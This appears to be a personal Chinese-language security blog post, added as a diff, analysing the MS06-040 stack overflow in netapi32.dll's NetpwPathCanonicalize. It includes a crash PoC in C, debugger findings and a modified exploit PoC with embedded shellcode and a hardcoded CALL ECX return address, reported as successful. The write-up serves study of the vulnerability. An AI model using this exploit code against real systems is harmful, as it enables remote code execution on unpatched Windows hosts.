@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简要分析漏洞点存在为netapi32.dll中的NetpwPathCanonicalize()导出函数，NetpwPathCanonicalize()是netapi32.dll的一个导出函数，用于格式化网络路径字符串，它的原型如下： 12345678int NetpwPathCanonicalize (uint16 path[ ], &#x2F;&#x2F; [in] path nameuint8 can_path[">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ms06-040分析">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;ms06-040%E5%88%86%E6%9E%90&#x2F;index.html">
+<meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="简要分析漏洞点存在为netapi32.dll中的NetpwPathCanonicalize()导出函数，NetpwPathCanonicalize()是netapi32.dll的一个导出函数，用于格式化网络路径字符串，它的原型如下： 12345678int NetpwPathCanonicalize (uint16 path[ ], &#x2F;&#x2F; [in] path nameuint8 can_path[">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;ms06-040%E5%88%86%E6%9E%90&#x2F;ms06040dbg1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;ms06-040%E5%88%86%E6%9E%90&#x2F;ms06040dbg2.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;ms06-040%E5%88%86%E6%9E%90&#x2F;ms06040dbg3.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;ms06-040%E5%88%86%E6%9E%90&#x2F;ms06040dbg4.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;ms06-040%E5%88%86%E6%9E%90&#x2F;ms06040success1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;ms06-040%E5%88%86%E6%9E%90&#x2F;ms06040dbg5.JPG">
+<meta property="og:updated_time" content="2020-04-16T14:08:26.386Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;ms06-040%E5%88%86%E6%9E%90&#x2F;ms06040dbg1.JPG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/16/ms06-040分析/"/>
+
+
+
+
+
+  <title>ms06-040分析 | Ivoripuion's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ivoripuion's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/pwn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/reverse" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            reverse
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-随想">
+          <a href="/categories/%E9%9A%8F%E6%83%B3" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            随想
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/16/ms06-040%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ms06-040分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-16T22:00:44+08:00">
+                2020-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h1><p>漏洞点存在为netapi32.dll中的NetpwPathCanonicalize()导出函数，NetpwPathCanonicalize()是netapi32.dll的一个导出函数，用于格式化网络路径字符串，它的原型如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int NetpwPathCanonicalize (</span><br><span class="line">uint16 path[ ], // [in] path name</span><br><span class="line">uint8 can_path[ ], // [out] canonicalized path</span><br><span class="line">uint32 maxbuf, // [in] max size of can_path</span><br><span class="line">uint16 prefix[ ], // [in] path prefix</span><br><span class="line">uint32* pathtype, // [in out] path type</span><br><span class="line">uint32 pathflags // [in] path flags, 0 or 1</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>这是一个Unicode字符串处理函数，大体功能是：如果prefix串非空，将prefix串与path串用‘\’相连，并复制到输出串can_path中，输出串的容量为maxbuf字节大小：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">can_path=prefix+&quot;\&quot;+path</span><br></pre></td></tr></table></figure>
+
+<p>触发漏洞的POC：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">long</span> *, <span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">	<span class="keyword">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">	<span class="keyword">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">	<span class="keyword">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line"></span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	MYPROC Trigger;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> dll[ ] = <span class="string">"./netapi32.dll"</span>;</span><br><span class="line">	<span class="keyword">char</span> VulFunc[ ] = <span class="string">"NetpwPathCanonicalize"</span>;</span><br><span class="line">	LibHandle = LoadLibrary(dll);</span><br><span class="line">	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="string">'a'</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="string">'b'</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">	</span><br><span class="line">	(Trigger)(path,can_path,maxbuf,prefix,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">	FreeLibrary(LibHandle);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POC说明：导入存在漏洞的netapi32.dll中的NetpwPathCanonicalize函数，将path和prefix设置的很长以触发漏洞。</p>
+<p>运行后报错，使用OD attach：</p>
+<p><img src="./ms06040dbg1.JPG" alt=""></p>
+<p>EIP被覆盖为”aaaa”的ascii：0x61616161，可见传入的参数溢出，覆盖了EIP。</p>
+<p>算出VA：0x75107B13</p>
+<p>在这里程序再一次crash：</p>
+<p><img src="./ms06040dbg2.JPG" alt=""></p>
+<p>在这个wscat的拼接函数完成后存储返回地址的地方（0x12F6A8）被覆盖：</p>
+<p><img src="./ms06040dbg3.JPG" alt=""></p>
+<p><img src="./ms06040dbg4.JPG" alt=""></p>
+<p>根据ECX总是指向栈开始的buff可以构造如下shellcode：</p>
+<p>shellcode+patch+(jmp ecx)</p>
+<p>call ecx：0x796DB16C</p>
+<p>修改后POC：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">long</span> *, <span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x74\x65\x73\x74\x68\x6D\x69\x78\x69\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">	<span class="keyword">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">	<span class="keyword">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">	<span class="keyword">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">	<span class="keyword">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line"></span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	MYPROC Trigger;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> dll[ ] = <span class="string">"./netapi32.dll"</span>;</span><br><span class="line">	<span class="keyword">char</span> VulFunc[ ] = <span class="string">"NetpwPathCanonicalize"</span>;</span><br><span class="line">	</span><br><span class="line">	LibHandle = LoadLibrary(dll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//__asm int 3;</span></span><br><span class="line"></span><br><span class="line">	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">	<span class="built_in">memset</span>(path,<span class="string">'a'</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">	<span class="built_in">memset</span>(prefix,<span class="string">'b'</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memcpy</span>(prefix,shellcode,<span class="number">168</span>);</span><br><span class="line"></span><br><span class="line">	path[<span class="number">0x318</span>]=<span class="number">0x6C</span>;<span class="comment">// address of CALL ECX</span></span><br><span class="line">	path[<span class="number">0x319</span>]=<span class="number">0xB1</span>;</span><br><span class="line">	path[<span class="number">0x31A</span>]=<span class="number">0x6D</span>;</span><br><span class="line">	path[<span class="number">0x31B</span>]=<span class="number">0x79</span>;</span><br><span class="line"></span><br><span class="line">	(Trigger)(path,can_path,maxbuf,prefix ,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">	FreeLibrary(LibHandle);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击成功：</p>
+<p><img src="./ms06040success1.JPG" alt=""></p>
+<p>静态分析结果：</p>
+<p><img src="./ms06040dbg5.JPG" alt=""></p>
+<p>按照ASCII字符开辟空间，按照Unicode字符来检查边界是漏洞的根本原因。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/16/%E7%94%9F%E8%BE%B0%E7%BA%B2%E6%A1%88/" rel="next" title="生辰纲案">
+                <i class="fa fa-chevron-left"></i> 生辰纲案
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/me.jpg"
+                alt="Ivoripuion" />
+            
+              <p class="site-author-name" itemprop="name">Ivoripuion</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简要分析"><span class="nav-number">1.</span> <span class="nav-text">简要分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ivoripuion</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
